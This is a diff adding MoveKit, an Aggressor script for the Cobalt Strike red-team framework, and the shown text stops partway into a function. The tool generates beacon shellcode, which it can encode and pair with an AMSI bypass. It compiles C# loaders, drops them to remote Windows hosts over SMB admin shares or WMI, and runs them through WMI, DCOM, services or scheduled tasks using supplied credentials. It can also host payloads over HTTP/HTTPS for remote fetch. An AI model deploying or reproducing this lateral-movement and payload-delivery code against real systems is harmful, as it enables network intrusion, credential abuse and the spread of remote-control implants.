@@ -1,0 +1,1088 @@
+#
+#
+# MoveKit
+# by: @0xthirteen
+#
+# Currently compiling will work on Linux (may support Win/Mac in the future)
+#
+# Dependencies:
+#	- Mono - dynamic assembly building
+#
+#
+
+
+include(script_resource("Aggressor/moveDialogs.cna"));
+include(script_resource("Aggressor/moveCommands.cna"));
+include(script_resource("Aggressor/payloadGen.cna"));
+include(script_resource("Aggressor/helpMenus.cna"));
+global('%moveKit::movedefaults')
+
+menubar("Move", "movement", 2);
+popup movement {
+	menu Exec-Only{
+		item "WMI"{
+			moveDialogs::wmi();
+		}
+		item "RDP"{
+			moveDialogs::rdp();
+		}
+		item "SCM"{
+			moveDialogs::scm();
+		}
+		item "DCOM"{
+			moveDialogs::dcom();
+		}
+		item "TaskScheduler"{
+			moveDialogs::taskschedule();
+		}
+		item "Modify SchTask"{
+			moveDialogs::modifyscheduledtask();
+		}
+		item "Modify Service"{
+			moveDialogs::modifyservice();
+		}
+	}
+	menu Shellcode-Exec{
+		item "WMI Event Sub"{
+			moveDialogs::eventsubexec();
+		}
+		item "Excel 4.0 DCOM"{
+			moveDialogs::exceldcomexec();
+		}
+	}
+	menu Command{
+		item "MSHTA"{
+			moveDialogs::mshta_cmd();
+		}
+		item "RegSvr32"{
+			moveDialogs::regsvr32_cmd();
+		}
+		item "WMIC"{
+			moveDialogs::wmic_cmd();
+		}
+	}
+	menu File{
+		item "Custom (Prebuilt)"{
+			moveDialogs::custom_prebuilt();
+		}
+		item "MSBuild"{
+			moveDialogs::msbuild();
+		}
+		item "InstallUtil"{
+			moveDialogs::installutil();
+		}
+		item "MSHTA"{
+			moveDialogs::mshta_file();
+		}
+		item "RegSvr32"{
+			moveDialogs::regsvr32_file();
+		}
+		item "WMIC"{
+			moveDialogs::wmic_file();
+		}
+		item "Custom (Non-Prebuilt)"{
+			moveDialogs::custom_nonprebuilt();
+		}
+		menu Hijacks{
+			item "Service DLL Hijack"{
+				moveDialogs::service_dll_hijack();
+			}
+			item "DCOM Hijack"{
+				moveDialogs::dcom_hijack();
+			}
+		}
+	}
+	item "Write File Only"{
+		moveDialogs::write_file_only();
+	}
+	item "Set/Update Defaults"{
+		moveKit::updateglobals();
+	}
+}
+
+#Global Defaults
+%moveKit::movedefaults["droptype"] = "SMB";
+%moveKit::movedefaults["cmdtrigger"] = "WMI";
+%moveKit::movedefaults["location"] = "";
+%moveKit::movedefaults["file"] = "";
+%moveKit::movedefaults["override"] = "";
+%moveKit::movedefaults["droplocation"] = "C:\\Windows\\Temp";
+%moveKit::movedefaults["filename"] = "moveme.exe";
+%moveKit::movedefaults["eventname"] = "Debug";
+%moveKit::movedefaults["auto"] = "true";
+%moveKit::movedefaults["x86"] = "false";
+%moveKit::movedefaults["staged"] = "false";
+%moveKit::movedefaults["amsi"] = "false";
+%moveKit::movedefaults["shellcodeformat"] = "base64";
+%moveKit::movedefaults["findstring"] = "\$\$PAYLOAD\$\$";
+
+sub moveKit::updateglobals{
+	local('$dialog');
+	$dialog = dialog("Defaults variables", %moveKit::movedefaults, &moveKit::saveoptions);
+	dialog_description($dialog, "Defaults variables that are applied where used");
+	drow_combobox($dialog, "droptype", "File Drop Method: ", @("WMI", "SMB"));
+	drow_combobox($dialog, "cmdtrigger", "Command Trigger: ", @("WMI", "RDP", "SCM", "SCHTASK", "ModifySchTask", "ModifyService", "DCOM ShellWindows", "DCOM MMC", "DCOM ShellBrowserWindow", "DCOM ExcelDDE"));
+	drow_text($dialog, "location", "Location: ");
+	drow_text($dialog, "droplocation", "DropLocation: ");
+	drow_text($dialog, "filename", "DropFileName: ");
+	drow_text($dialog, "eventname", "EventName: ");
+	drow_file($dialog, "file", "File: ");
+	drow_text($dialog, "override", "Custom Command: ");
+	drow_combobox($dialog, "shellcodeformat", "Shellcode Format: ", @("raw", "base64", "array", "hex", "powershell-base64", "vba", "vbs", "veil"));
+	drow_text($dialog, "findstring", "Find/Replace String: ");
+	drow_checkbox($dialog, "auto", "Auto: ", "Auto Host or Move file");
+	drow_checkbox($dialog, "x86", "x86: ", "Use x86 arch payload");
+	drow_checkbox($dialog, "amsi", "AMSI: ", "AMSI Bypass");
+	drow_checkbox($dialog, "staged", "Staged: ", "Use staged payload");
+	dbutton_action($dialog, "Update");
+	dialog_show($dialog);
+}
+
+sub moveKit::saveoptions{
+	local('%options');
+	%options = $3;
+	%moveKit::movedefaults["cmdtrigger"] = %options["cmdtrigger"];
+	%moveKit::movedefaults["droptype"] = %options["droptype"];
+	%moveKit::movedefaults["location"] = %options["location"];
+	%moveKit::movedefaults["droplocation"] = %options["droplocation"];
+	%moveKit::movedefaults["filename"] = %options["filename"];
+	%moveKit::movedefaults["eventname"] = %options["eventname"];
+	%moveKit::movedefaults["staged"] = %options["staged"];
+	%moveKit::movedefaults["x86"] = %options["x86"];
+	%moveKit::movedefaults["auto"] = %options["auto"];
+	%moveKit::movedefaults["amsi"] = %options["amsi"];
+	%moveKit::movedefaults["file"] = %options["file"];
+	%moveKit::movedefaults["override"] = %options["override"];
+	%moveKit::movedefaults["shellcodeformat"] = %options["shellcodeformat"];
+	%moveKit::movedefaults["findstring"] = %options["findstring"];
+	show_message("Defaults have been saved");
+}
+
+sub moveKit::credentialparser{
+	local('$domain $usps $user $password');
+	($domain, $usps) = split("\\\\", $1);
+	($user, $password) = split(" ", $usps);
+	$creds = 'username="';
+	$creds .= $domain;
+	$creds .= '\\';
+	$creds .= $user; 
+	$creds .= '" password="';
+	$creds .= $password;
+	$creds .= '"';
+	return $creds;
+}
+
+sub moveKit::buildassembly{
+	local('$basesixty $bid $pldata $monotest $testres $handle2 $smidata $fp $savelocation $bltasm $handl3 $interop $buildasm $assembly_size')
+	$pldata = $1;
+	$bid = $2;
+	$basesixty = base64_encode($pldata);
+	$monotest = exec("which mcs");
+	$testres = readAll($monotest);	
+	if($testres eq "@()"){
+		show_message("It appears you do not have mono (mono compiler mcs) installed\nYou will not be able to build assemblies without it");
+		exit();
+	}
+	#location of .CS source file
+	$handle2 = openf(script_resource("Assemblies/FileWrite.cs"));
+	$swmidata = readb($handle2, -1);
+	closef($handle2);
+	$fp = strrep($swmidata, 'LOADLOADLOAD', $basesixty);
+	$savelocation = script_resource("Assemblies/dynamic-build.cs");
+	$bltasm = script_resource("Assemblies/dfw.exe");
+	$handle3 = openf(">$savelocation");
+	writeb($handle3, $fp);
+	closef($handle3);
+	$buildasm = exec("mcs /reference:System.Management -out:$bltasm $savelocation");
+	@data = readAll($buildasm);
+	closef($buildasm);
+
+	bpause($bid, 2000);
+
+	#Check if assembly meets compilation size limit - should be 1MB limit but it seems it needs to be a little less
+	#You can only see at the teamserver if the file is too big, it will exit silenty otherwise
+	$assembly_size = int(lof($bltasm));
+	if($assembly_size >= 960000){
+		berror($bid, "\c4Error: Created assembly is too big. Available options: \n   1)WMI location URL\n   2)WMI location Windows directory\n   3)SMB file drop method");
+		exit();
+	}
+}
+
+sub moveKit::compilepl{
+	local('$cmpdata $prebuild $cmpledfl $handle4 $buildcpled $handle $sourcepay $desc $refs $templ $archi $platf $saveas $cmplrtest $testres');
+	$sourcepay = $1;
+	$desc = $2;
+	$templ = $3;
+	$archi = $4;
+	$compiler = "mcs";
+	$cmplrtest = exec("which $compiler");
+	$testres = readAll($cmplrtest);
+	if($testres eq "@()"){
+		show_message("It appears you do not have the right compiler \($compiler\) installed, Mono is required to build this payload");
+		exit();
+	}
+
+	if($desc ismatch '^InstallUtil.*'){
+		$saveas = script_resource("Templates/InstallUtil.exe");
+		$refs = "/reference:System.Configuration.Install";
+	}
+	else if($desc ismatch '^NonPreBuiltCustom.*'){
+		$saveas = script_resource("Templates/CustomNonPre.exe");
+		if($templ ismatch '^service-.*'){
+			$refs = "/reference:System.ServiceProcess"
+		}
+	}
+	else if($desc ismatch '^Shellcode-.*'){
+		$saveas = script_resource("ExcelDCOM.exe");
+	}
+	if($archi eq "x86"){
+		$platf = "-platform:x86";
+	}
+	else if($archi eq "x64"){
+		$platf = "-platform:x64";
+	}
+	$prebuild = script_resource("Templates/TempPreCompileFile.cs");
+	$handle4 = openf(">$prebuild");
+	writeb($handle4, $sourcepay);
+	closef($handle4);
+
+	$buildcpled = exec("mcs $platf $refs -out:$saveas $prebuild");
+	@datax = readAll($buildcpled);
+	closef($buildcpled);
+	sleep(2000);
+
+	if($desc ismatch '^Shellcode-.*'){
+		deleteFile($prebuild);
+		return;
+	}
+	else{
+		$cmpledfl = openf($saveas);
+		$cmpdata = readb($cmpledfl, -1);
+		closef($cmpledfl);
+
+		deleteFile($saveas);
+		deleteFile($prebuild);
+		return $cmpdata;
+	}
+}
+
+sub moveKit::customhandler{
+	local('$data $handle $sharptask $descname $sharpasm $extinfo $fwargs')
+	$sharptask = $2;
+	$descname = $3;
+	$fwargs = $4;
+	$sharpasm = "Assemblies/SharpMove.exe";
+
+	if($1['cmdtrigger'] eq "RDP"){
+		$sharpasm = "Assemblies/SharpRDP.exe";
+	}
+
+	if($1['auto'] eq "true"){
+		$handle = openf($1['file']);
+		$data = readb($handle, -1);
+		closef($handle);
+		if($1['droptype'] eq "WMI"){
+			if(($1['location'] ismatch '^(/[^/ ]*)+/?$') || ($1['location'] eq "local")){
+				&moveKit::buildassembly($data, $1['bid']);
+			}
+			else{
+				&moveKit::filelocator($1['bid'], $1['location'], $description, $data, $1['filename']);
+			}
+		}
+		&moveKit::filewrite($1['bid'], $1['computername'], $1['droplocation'], $1['filename'], $data, $1['droptype'], $fwargs);
+
+	}
+	$extinfo = "$1['cmdtrigger'] command trigger and $1['droptype'] file write";
+	&moveKit::taskexec($1['bid'], $sharpasm, $sharptask, $descname, $extinfo);
+}
+
+sub moveKit::shellconly{
+	local('$ops $task')
+	$ops = $1;
+	$task = $2;
+	$desc = $3;
+	$pltype = "raw";
+	$sharpasm = "ExcelDCOM.exe";
+
+	if($ops['x86'] eq "false"){
+		$plarch = "x64";
+	}
+	if($ops['staged'] eq "false"){
+		if($pltype eq "raw"){
+			$shcode = artifact_payload($ops['listener'], $pltype, $plarch);
+			if(%movedefaults["shellcodeformat"] eq "raw"){
+				$finshellc = $shcode;
+			}
+			else if(%movedefaults["shellcodeformat"] eq "base64"){
+				$finshellc = base64_encode($shcode);
+			}
+			else{
+				$finshellc = transform($shcode, %movedefaults["shellcodeformat"])
+			}
+		}
+	}
+	else{
+		if($pltype eq "raw"){
+			$shcode = artifact_stager($ops['listener'], $pltype, $plarch);
+			if(%movedefaults["shellcodeformat"] eq "raw"){
+				$finshellc = $shcode;
+			}
+			else if(%movedefaults["shellcodeformat"] eq "base64"){
+				$finshellc = base64_encode($shcode);
+			}
+			else{
+				$finshellc = transform($shcode, %movedefaults["shellcodeformat"])
+			}
+		}
+	}
+	$outpl = openf(script_resource("ExcelDCOM.cs"));
+	$data = readb($outpl, -1);
+	closef($outpl);
+	$noncompiled = strrep($data, %movedefaults["findstring"], $finshellc);
+	&moveKit::compilepl($noncompiled, $desc, $null, $plarch);
+	&moveKit::execprep($ops, $sharpasm, $task, $desc);
+}
+
+sub moveKit::writeonlyhandler{
+	local('$gen $bid $writeargs $plarch $shcode $finalpayload');
+	$gen = $1;
+	$bid = $1['bid'];
+	$filename = $gen['filename'];
+	$dlocation = $gen['droplocation'];
+	$target = $gen['computername'];
+	$writeargs = $2;
+
+	if($gen['listener'] ne ""){
+		if(%moveKit::movedefaults['x86'] eq "false"){
+			$plarch = "x64";
+		}
+		else{
+			$plarch = "x86";
+		}
+		if($gen['staged'] eq "false"){
+			$shcode = artifact_payload($gen['listener'], "raw", $plarch);
+			if(%moveKit::movedefaults["shellcodeformat"] eq "raw"){
+				$finshellc = $shcode;
+			}
+			else if(%moveKit::movedefaults["shellcodeformat"] eq "base64"){
+				$finshellc = base64_encode($shcode);
+			}
+			else{
+				$finshellc = transform($shcode, %moveKit::movedefaults["shellcodeformat"])
+			}
+		}
+		else{
+			#$shcode = artifact_stager($gen['listener'], $pltype, $plarch);
+			$shcode = stager($gen['listener'], $plarch);
+			if(%moveKit::movedefaults["shellcodeformat"] eq "raw"){
+				$finshellc = $shcode;
+			}
+			else if(%moveKit::movedefaults["shellcodeformat"] eq "base64"){
+				$finshellc = base64_encode($shcode);
+			}
+			else{
+				$finshellc = transform($shcode, %moveKit::movedefaults["shellcodeformat"])
+			}
+		}
+
+		if($gen['template'] ne ""){
+			$outpl = openf($gen['template']);
+			$data = readb($outpl, -1);
+			closef($outpl);
+			$noncompiled = strrep($data, %moveKit::movedefaults["findstring"], $finshellc);
+			# Need to find a way to handle this
+			if($compileit eq "true"){
+				$finalpayload = &compilepl($noncompiled, $gen['description'], $template, $plarch);
+			}
+			else{
+				$finalpayload = $noncompiled;
+			}
+		}
+		else{
+			$finalpayload = $finshellc;
+		}
+	}
+	if($gen['file'] ne ""){
+		$outpl = openf($gen['file']);
+		$data = readb($outpl, -1);
+		closef($outpl);
+		if($gen['b64file'] eq "true"){
+			$finalpayload = base64_encode($data);
+		}
+		else{
+			$finalpayload = $data;
+		}
+		
+	}
+
+
+	if($gen['writetype'] ismatch "^WMI.*"){
+		if(($gen['location'] ismatch '^(/[^/ ]*)+/?$') || ($gen['location'] eq "local")){
+			&moveKit::buildassembly($finalpayload, $bid);
+		}
+		else{
+			&moveKit::filelocator($bid, $gen['location'], $gen['description'], $finalpayload, $gen['filename']);
+		}
+	}
+
+
+	($drive, $path) = split(':', $gen['droplocation']);
+	if($gen['writetype'] ismatch "^WMI.*"){
+		btask($bid, "" . dstamp(ticks()) . " - Writing $filename to $dlocation on $target via WMI");
+		bexecute_assembly($bid, script_resource("Assemblies/dfw.exe"), $writeargs);
+		bpause($bid, 8000);
+		return;
+	}
+	else if($gen['writetype'] ismatch "^SMB.*"){
+		if($drive ismatch '[a-zA-Z]'){
+			$drive .= "\$";
+		}
+		else{
+			$drive = "C\$";
+		}
+		btask($bid, "" . dstamp(ticks()) . " - Writing $filename to $dlocation on $target via SMB");
+		while $upload (bupload_raw!($1, "\\\\$target\\$drive\\$path\\$filename", $payl)){
+			bpause($bid, 2000);
+		}
+		return;
+	}
+}
+
+sub moveKit::proccmdbuilder{
+	local('$creds $lateralarg $command $computername $credential $cmdtrgr $eventn $amsi $cred')
+	$creds = "";
+	$lateralarg = "";
+	$command = $1;
+	$computername = $2;
+	$credential = $3;
+	$cmdtrgr = $4;
+	$eventn = $5;
+	$amsi = $6;
+
+	# Command trigger types
+	if($cmdtrgr eq "WMI"){
+		$lateralarg = 'action=create ';
+	}
+	else if($cmdtrgr eq "SCHTASK"){
+		$lateralarg = 'action=taskscheduler ';
+	}
+	else if($cmdtrgr hasmatch "^DCOM"){
+		($trig, $mthd) = split(' ', $cmdtrgr);
+		$lateralarg = 'action=dcom ' ;
+		$lateralarg .= 'method="';
+		$lateralarg .= $mthd;
+		$lateralarg .= '" ';
+	}
+	else if($cmdtrgr eq "SCM"){
+		$lateralarg = 'action=scm ';
+	}
+
+	else if($cmdtrgr eq "ModifyService"){
+		$lateralarg = 'action=modsvc ';
+	}
+	else if($cmdtrgr eq "ModifySchTask"){
+		$lateralarg = 'action=modschtask ';
+	}
+	if($computername ne ""){
+		$lateralarg .= 'computername=';
+		$lateralarg .= $computername;
+		$lateralarg .= ' ';
+	}
+	if($command ne ""){
+		$lateralarg .= 'command="';
+		$lateralarg .= $command;
+		$lateralarg .= '" ';
+	}
+	if($eventn ne ""){
+		$lateralarg .= 'taskname=';
+		$lateralarg .= $eventn;
+		$lateralarg .= ' ';
+	}
+	if(($eventn ne "") && ($cmdtrgr eq "SCM")){
+		$lateralarg .= 'servicename=';
+		$lateralarg .= $eventn;
+		$lateralarg .= ' ';
+	}
+	if(($eventn ne "") && ($cmdtrgr eq "ModifyService")){
+		$lateralarg .= 'servicename=';
+		$lateralarg .= $eventn;
+		$lateralarg .= ' ';
+	}
+	if($amsi eq "true"){
+		$lateralarg .= 'amsi=';
+		$lateralarg .= $amsi;
+		$lateralarg .= ' ';
+	}
+	if($credential ne ""){
+		$cred = moveKit::credentialparser($credential);
+		$lateralarg .= $cred;
+	}
+	return $lateralarg;
+}
+
+sub moveKit::filecmdbuilder{
+	local('$creds $lateralarg $location $droplocation $filename $eventname $computername $credential $command $amsi $cmdtrgr $dropmthd $trig $mthd $cred');
+	$creds = "";
+	$lateralarg = "";
+	$location = $1;
+	$droplocation = $2;
+	$filename = $3;
+	$eventname = $4;
+	$computername = $5;
+	$credential = $6;
+	$command = $7;
+	$amsi = $8;
+	$cmdtrgr = $9;
+	$dropmthd = $10;
+
+	# Command trigger types
+	if($cmdtrgr eq "WMI"){
+		$lateralarg = 'action=create ';
+	}
+	else if($cmdtrgr eq "SCHTASK"){
+		$lateralarg = 'action=taskscheduler ';
+	}
+	else if($cmdtrgr hasmatch "^DCOM"){
+		($trig, $mthd) = split(' ', $cmdtrgr);
+		$lateralarg = 'action=dcom ';
+		$lateralarg .= 'method=';
+		$lateralarg .= $mthd;
+		$lateralarg .= ' ';
+	}
+	else if($cmdtrgr eq "SCM"){
+		$lateralarg = 'action=scm';
+	}
+	else if($cmdtrgr eq "ModifyService"){
+		$lateralarg = 'action=modsvc';
+	}
+	else if($cmdtrgr eq "ModifySchTask"){
+		$lateralarg = 'action=modschtask';
+	}
+	if($computername ne ""){
+		$lateralarg .= 'computername=';
+		$lateralarg .= $computername;
+		$lateralarg .= ' ';
+	}
+	if($command ne ""){
+		$lateralarg .= 'command="';
+		$lateralarg .= $command;
+		$lateralarg .= '" ';
+	}
+	if(($eventname ne "") && ($cmdtrgr eq "SCHTASK")){
+		$lateralarg .= 'taskname=';
+		$lateralarg .= $eventname;
+		$lateralarg .= ' ';
+	}
+	if(($eventname ne "") && ($cmdtrgr eq "SCM")){
+		$lateralarg .= 'servicename=';
+		$lateralarg .= $eventname;
+		$lateralarg .= ' ';
+	}
+	if(($eventname ne "") && ($cmdtrgr eq "ModifyService")){
+		$lateralarg .= 'servicename=';
+		$lateralarg .= $eventname;
+		$lateralarg .= ' ';
+	}
+	if(($eventname ne "") && ($cmdtrgr eq "ModifySchTask")){
+		$lateralarg .= 'taskname=';
+		$lateralarg .= $eventname;
+		$lateralarg .= ' ';
+	}
+	if(($amsi ne "false" ) || ($asmi ne "")){
+		$lateralarg .= 'asmi=';
+		$lateralarg .= $asmi;
+		$lateralarg .= ' ';
+	}
+	if($credential ne ""){
+		$cred = moveKit::credentialparser($credential);
+		$lateralarg .= $cred;
+	}
+	return $lateralarg;
+}
+
+sub moveKit::writeonlybuilder{
+	local('$xx $writeargs');
+	$xx = $1;
+	$writeargs = "";
+	if($xx['writetype'] eq "WMI to file"){
+		$writeargs .= 'writetype=wmi ';
+	}
+	else if($xx['writetype'] eq "WMI to Regisry"){
+		$writeargs .= 'writetype=registry ';
+	}
+	else if($xx['writetype'] eq "WMI to New WMIClass"){
+		$writeargs .= 'writetype=wmiclass ';
+	}
+
+	if($xx['computername'] ne ""){
+		$writeargs .= 'computername=';
+		$writeargs .= $xx['computername'];
+		$writeargs .= ' ';
+	}
+	if($xx['eventname'] ne ""){
+		$writeargs .= 'eventname=';
+		$writeargs .= $xx['eventname'];
+		$writeargs .= ' ';
+	}
+	if($xx['location'] ne ""){
+		$writeargs .= 'location="';
+		$writeargs .= $xx['location'];
+		$writeargs .= '" ';
+	}
+	if($xx['droplocation'] ne ""){
+		$writeargs .= 'droplocation="';
+		$writeargs .= $xx['droplocation'];
+		$writeargs .= '" ';
+	}
+	if($xx['filename'] ne ""){
+		$writeargs .= 'filename="';
+		$writeargs .= $xx['filename'];
+		$writeargs .= '" ';
+	}
+	if($xx['wnamespace'] ne ""){
+		$writeargs .= 'wnamespace="';
+		$writeargs .= $xx['wnamespace'];
+		$writeargs .= '" ';
+	}
+	if($xx['valuename'] ne ""){
+		$writeargs .= 'valuename="';
+		$writeargs .= $xx['valuename'];
+		$writeargs .= '" ';
+	}
+	if($xx['reglocation'] ne ""){
+		$writeargs .= 'keypath="';
+		$writeargs .= $xx['reglocation'];
+		$writeargs .= '" ';
+	}
+	if($xx['classname'] ne ""){
+		$writeargs .= 'classname="';
+		$writeargs .= $xx['classname'];
+		$writeargs .= '" ';
+	}
+	if($xx['credential'] ne ""){
+		$cred = moveKit::credentialparser($credential);
+		$writeargs .= $cred;
+	}
+
+	&moveKit::writeonlyhandler($xx, $writeargs);
+}
+
+sub moveKit::fwargbuilder{
+	local('$ops');
+	$creds = "";
+	$lateralarg = "";
+	$ops = $1;
+
+	# File movement types - SMB will be done in CS rather than the assembly
+	if($ops['droptype'] eq "WMI"){
+		$lateralarg .= 'writetype=wmi ';
+	}
+	#else if($ops['droptype'] eq "SMB"){
+		#$lateralarg .= 'throw=smb';
+	#}
+	if($ops['computername'] ne ""){
+		$lateralarg .= 'computername=';
+		$lateralarg .= $ops['computername'];
+		$lateralarg .= ' ';
+	}
+	if($ops['location'] ne ""){
+		if(($location ismatch '^(/[^/ ]*)+/?$') || ($location eq "local")){
+			$lateralarg .= 'location=local ';
+		}
+		else{
+			$lateralarg .= 'location="';
+			$lateralarg .= $ops['location'];
+			$lateralarg .= '" ';
+		}
+	}
+	if($ops['droplocation'] ne ""){
+		$lateralarg .= 'droplocation="';
+		$lateralarg .= $ops['droplocation'];
+		$lateralarg .= '" ';
+	}
+	if($ops['filename'] ne ""){
+		$lateralarg .= 'filename=';
+		$lateralarg .= $ops['filename'];
+		$lateralarg .= ' ';
+	}
+	if($ops['eventname'] ne ""){
+		$lateralarg .= 'eventname=';
+		$lateralarg .= $ops['eventname'];
+		$lateralarg .= ' ';
+	}
+	if($ops['credential'] ne ""){
+		$cred = moveKit::credentialparser($credential);
+		$lateralarg .= $cred;
+	}
+	return $lateralarg;
+}
+
+sub moveKit::filelocator{
+	local('$bid $flocation $desc $hostedfile $fname $port $uris $hostloc $proto')
+	$bid = $1;
+	$flocation = $2;
+	$desc = $3;
+	$hostedfile = $4;
+	$fname = $5;
+	if($flocation hasmatch '^\w:\\.*'){
+		$beacupload = "$flocation\\$fname";
+		while $upload (bupload_raw!($bid, $flocation, $hostedfile)){
+			bpause($bid, 1000);
+		}
+	}
+	else if ($flocation hasmatch '(^http://)(.*?)(/.*)'){
+		$port = "80";
+		($proto, $hostloc, $uris) = matched();
+		site_host($hostloc, $port, $uris, $hostedfile, "automatic", $desc, false); 
+	}
+	else if ($flocation hasmatch '(^https://)(.*?)(/.*)'){
+		$port = "443";
+		($proto, $hostloc, $uris) = matched();
+		site_host($hostloc, $port, $uris, $hostedfile, "automatic", $desc, true); 
+	}
+	else{
+		berror($bid, "\c4Error: Could not detect a URL or directory path for the 'Location' field");
+		exit();
+	}
+	return;
+}
+
+sub moveKit::makeplandhost{
+	local('$plarch $pltype $descname $shcode $finshellc $outpl $data $finalpayload $port $uris $hostloc $proto $template $sharpasm $taskargs $fwargs $gen');
+	$gen = $1;
+	$pltype = $2;
+	$descname = $3;
+	$template = $4;
+	$sharpasm = $5;
+	$taskargs = $6;
+	$plarch = "x86";
+	if($gen['x86'] eq "false"){
+		$plarch = "x64"
+	}
+	if($gen['staged'] eq "false"){
+		if($pltype eq "raw"){
+			$shcode = artifact_payload($gen['listener'], $pltype, $plarch);
+			if(%movedefaults["shellcodeformat"] eq "raw"){
+				$finshellc = $shcode;
+			}
+			else if(%movedefaults["shellcodeformat"] eq "base64"){
+				$finshellc = base64_encode($shcode);
+			}
+			else{
+				$finshellc = transform($shcode, %movedefaults["shellcodeformat"])
+			}
+		}
+	}
+	else{
+		if($pltype eq "raw"){
+			#$shcode = artifact_stager($gen['listener'], $pltype, $plarch);
+			$shcode = stager($gen['listener'], $plarch);
+			if(%movedefaults["shellcodeformat"] eq "raw"){
+				$finshellc = $shcode;
+			}
+			else if(%movedefaults["shellcodeformat"] eq "base64"){
+				$finshellc = base64_encode($shcode);
+			}
+			else{
+				$finshellc = transform($shcode, %movedefaults["shellcodeformat"])
+			}
+		}
+	}
+	$outpl = openf(script_resource("Templates/$template"));
+	$data = readb($outpl, -1);
+	closef($outpl);
+	$finalpayload = strrep($data, %movedefaults["findstring"], $finshellc);
+
+	if ($gen['location'] hasmatch '(^http://)(.*?)(/.*)'){
+		$port = "80";
+		($proto, $hostloc, $uris) = matched();
+		site_host($hostloc, $port, $uris, $finalpayload, "automatic", $descname, false); 
+	}
+	else if ($gen['location'] hasmatch '(^https://)(.*?)(/.*)'){
+		$port = "443";
+		($proto, $hostloc, $uris) = matched();
+		site_host($hostloc, $port, $uris, $finalpayload, "automatic", $descname, true); 
+	}
+	else{
+		berror($bid, "\c4Error: Could not detect a URL");
+		exit();
+	}
+	&moveKit::execprep($gen, $sharpasm, $taskargs, $descname);
+}
+
+sub moveKit::payloadbuilder{
+	local('$shcode $pltype $template $description $taskargs $droppedpath $compileit $plarch $finshellc $noncompiled $outpl $data $finalpayload $sharpasm $fwargs $fwbin $gen');
+	$gen = $1;
+	$pltype = $2;
+	$template = $3;
+	$description = $4;
+	$taskargs = $5;
+	$droppedpath = $6;
+	$compileit = $7;
+	$sharpasm = $8;
+	$fwargs = $9;
+	$fwbin = $10;
+	$plarch = "x86";
+	if($gen['x86'] eq "false"){
+		$plarch = "x64";
+	}
+	if($gen['staged'] eq "false"){
+		if($pltype eq "raw"){
+			$shcode = artifact_payload($gen['listener'], $pltype, $plarch);
+			if(%moveKit::movedefaults["shellcodeformat"] eq "raw"){
+				$finshellc = $shcode;
+			}
+			else if(%moveKit::movedefaults["shellcodeformat"] eq "base64"){
+				$finshellc = base64_encode($shcode);
+			}
+			else{
+				$finshellc = transform($shcode, %moveKit::movedefaults["shellcodeformat"])
+			}
+		}
+	}
+	else{
+		if($pltype eq "raw"){
+			#$shcode = artifact_stager($gen['listener'], $pltype, $plarch);
+			$shcode = stager($gen['listener'], $plarch);
+			if(%moveKit::movedefaults["shellcodeformat"] eq "raw"){
+				$finshellc = $shcode;
+			}
+			else if(%moveKit::movedefaults["shellcodeformat"] eq "base64"){
+				$finshellc = base64_encode($shcode);
+			}
+			else{
+				$finshellc = transform($shcode, %moveKit::movedefaults["shellcodeformat"])
+			}
+		}
+	}
+	$outpl = openf(script_resource("Templates/$template"));
+	$data = readb($outpl, -1);
+	closef($outpl);
+	$noncompiled = strrep($data, %moveKit::movedefaults["findstring"], $finshellc);
+	if($compileit eq "true"){
+		$finalpayload = &compilepl($noncompiled, $description, $template, $plarch);
+	}
+	else{
+		$finalpayload = $noncompiled;
+	}
+
+	if($gen['droptype'] eq "WMI"){
+		if(($gen['location'] ismatch '^(/[^/ ]*)+/?$') || ($gen['location'] eq "local")){
+			&moveKit::buildassembly($finalpayload, $gen['bid']);
+		}
+		else{
+			&moveKit::filelocator($gen['bid'], $gen['location'], $description, $finalpayload, $gen['filename']);
+		}
+	}
+	&moveKit::filewrite($gen['bid'], $gen['computername'], $droppedpath, $gen['filename'], $finalpayload, $gen['droptype'], $fwargs);
+	return;
+}
+
+sub moveKit::execprep{
+	local('$sharpasm, $sharptask, $descname, $extinfo')
+	$sharpasm = $2;
+	$sharptask = $3;
+	$descname = $4;
+	if($1['auto'] eq "true"){
+		if($descname ismatch '.*-Command.*'){
+			$extinfo = "$1['cmdtrigger'] command trigger and located at $1['location']";
+		}
+		else{
+			$extinfo = "$1['cmdtrigger'] command trigger and $1['droptype'] file write";
+		}
+	}
+	else{
+		$extinfo = "$1['cmdtrigger'] command trigger";
+	}
+	$l = listener_describe($1['listener']);
+	&moveKit::taskexec($1['bid'], $sharpasm, $sharptask, $descname, $extinfo);
+
+	if($1['x86'] eq "true"){
+		$larch = "x86";
+	}
+	else{
+		$larch = "x64";
+	}
+	if($l hasmatch "beacon_bind_pipe"){
+		if($1['staged'] eq "true"){
+			beacon_stage_pipe($1['bid'], $1['computername'], $1['listener'], $larch);
+		}
+		bpause($1['bid'], 5000);
+		#blink($1['bid'], $1['computername']);
+		beacon_link($1['bid'], $1['computername'], $1['listener']);
+	}
+	else if($l hasmatch "beacon_bind_tcp"){
+		if($1['staged'] eq "true"){
+			bstage();
+			beacon_stage_tcp($1['bid'], $1['computername'], 1234, ,$1['listener'], $larch);
+		}
+		bpause($1['bid'], 5000);
+		#bconnect($1['bid'], $1['computername']);
+		beacon_link($1['bid'], $1['computername'], $1['listener']);
+	}
+}
+
+sub moveKit::taskexec{
+	local('$bid $sharpasm $sharptask $desc_type $extras');
+	$bid = $1;
+	$sharpasm = $2;
+	$sharptask = $3;
+	$desc_type = $4;
+	$extras = $5;
+	binput($bid, "MoveKit Lateral Movement");
+	btask($bid, "" . dstamp(ticks()) . " - Executing SharpMove for $desc_type with $extras");
+	bexecute_assembly!($bid, script_resource($sharpasm), $sharptask);
+}
+
+sub moveKit::filewrite{
+	local('$bid $target $dlocation $filename $payl $drive $path $upload $writetype $fwargs $exec');
+	$bid = $1;
+	$target = $2;
+	$dlocation = $3;
+	$filename = $4;
+	$payl = $5;
+	$writetype = $6;
+	$fwargs = $7;
+	$x = "true";
+	($drive, $path) = split(':', $dlocation);
+
+	if($writetype eq "WMI"){
+		btask($bid, "" . dstamp(ticks()) . " - Writing $filename to $dlocation on $target via WMI");
+		bexecute_assembly!($bid, script_resource("Assemblies/dfw.exe"), $fwargs);
+		bpause($bid, 8000);
+		return;
+	}
+	else if($writetype eq "SMB"){
+		if($drive ismatch '[a-zA-Z]'){
+			$drive .= "\$";
+		}
+		else{
+			$drive = "C\$";
+		}
+		btask($bid, "" . dstamp(ticks()) . " - Writing $filename to $dlocation on $target via SMB");
+		while $upload (bupload_raw!($1, "\\\\$target\\$drive\\$path\\$filename", $payl)){
+			bpause($bid, 2000);
+		}
+		return;
+	}
+}
+
+sub moveKit::bearings{
+	local('$sharptask $drplocation $bid $latcommand $payloadtype $compile $descname $exectemplate $fwargs $fwbin');
+	$sharptask = "";
